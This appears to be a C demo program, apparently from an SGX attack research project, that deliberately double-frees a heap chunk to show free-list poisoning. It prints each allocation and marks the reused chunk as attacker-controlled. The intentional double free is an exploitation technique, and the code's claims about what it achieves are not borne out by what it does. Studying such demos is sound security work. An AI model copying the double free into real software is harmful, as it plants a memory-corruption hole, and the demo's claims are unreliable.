/* utility headers */

#include <sys/mman.h>
#include <signal.h>
#include "sgx-step/libsgxstep/apic.h"
#include "sgx-step/libsgxstep/cpu.h"
#include "sgx-step/libsgxstep/pt.h"
#include "sgx-step/libsgxstep/sched.h"
#include "sgx-step/libsgxstep/elf_parser.h"
#include "sgx-step/libsgxstep/enclave.h"
#include "sgx-step/libsgxstep/debug.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/idt.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/cache.h"
#include <string.h>  // For memcpy
#include "Enclave/encl_u.h"  // For test_dummy

/* SGX untrusted runtime */
#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <pthread.h>

#define DO_TIMER_STEP      0


int main( int argc, char **argv )
{

    printf("🔴 Exploiting double free for free list poisoning\n");

    // Step 1: Allocate two chunks
    char *chunk1 = malloc(64);
    char *chunk2 = malloc(64);  // Prevent consolidation

    printf("[+] Chunk1 allocated at: %p\n", chunk1);
    printf("[+] Chunk2 allocated at: %p\n", chunk2);

    // Step 2: Free the first chunk twice (Double Free)
    free(chunk1);
    free(chunk1);  // Double free vulnerability

    // Step 3: Allocate two new chunks, one of which will return the same address as chunk1
    char *chunk3 = malloc(64);
    char *chunk4 = malloc(64);

    printf("[+] Chunk3 allocated at: %p (should overlap with chunk1)\n", chunk3);
    printf("[+] Chunk4 allocated at: %p\n", chunk4);

    // Step 4: Overwrite chunk3 (which overlaps with chunk1) with fake free list pointers
    strcpy(chunk3, "\x90\x90\x90\x90");  // Attacker-controlled data (could be a fake address)

    // Step 5: Allocate another chunk, which should now return our manipulated memory
    char *chunk5 = malloc(64);
    printf("[+] Chunk5 allocated at: %p (attacker-controlled!)\n", chunk5);

    return 0;
}